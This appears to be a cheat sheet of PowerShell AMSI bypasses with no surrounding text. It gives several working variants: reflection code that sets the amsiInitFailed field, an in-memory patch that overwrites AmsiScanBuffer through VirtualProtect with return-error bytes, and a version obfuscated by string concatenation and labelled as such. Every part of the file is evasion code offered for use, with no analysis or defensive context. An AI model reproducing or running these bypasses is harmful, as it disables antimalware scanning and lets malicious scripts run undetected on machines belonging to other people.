$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)

$A='System.Management.Automation.AmsiUtils';$B='amsiInitFailed';[Ref].Assembly.GetType($A).GetField($B,'NonPublic,Static').SetValue($null,$true)


$amsi = 'AmsiUtils';$type=[Ref].Assembly.GetType("System.Management.Automation." + $amsi)
$type.GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true)

===============================
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$Addr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
$Patch = [Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)  # mov eax,0x80070057; ret
[Win32]::VirtualProtect($Addr, [uint32]$Patch.Length, 0x40, [ref]0) | Out-Null
for ($i = 0; $i -lt $Patch.Length; $i++) {
  [System.Runtime.InteropServices.Marshal]::WriteByte($Addr, $i, $Patch[$i])
}

=============================

#Obfuscated AMSI Bypass

$e='u'+''+'si'+'ng Sy'+'ste'+'m;'+'
u'+'sin'+'g Sys'+'tem.'+'Run'+'time.I'+'nteropS'+'ervices;'+'
pub'+'lic cla'+'ss X{'+'[DllImport("kernel32")]public static extern IntPtr G(IntPtr h,string p);'+
'[DllImport("kernel32")]public static extern IntPtr L(string n);'+
'[DllImport("kernel32")]public static extern bool V(IntPtr a, UIntPtr l, uint n, out uint o);}';
Add-Type $e;
$p=[Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);
$a=[X]::G([X]::L("amsi.dll"),"AmsiScanBuffer");
[X]::V($a, [uint32]$p.Length, 0x40, [ref]0) | Out-Null;
for($i=0;$i -lt $p.Length;$i++){[System.Runtime.InteropServices.Marshal]::WriteByte($a, $i, $p[$i])}


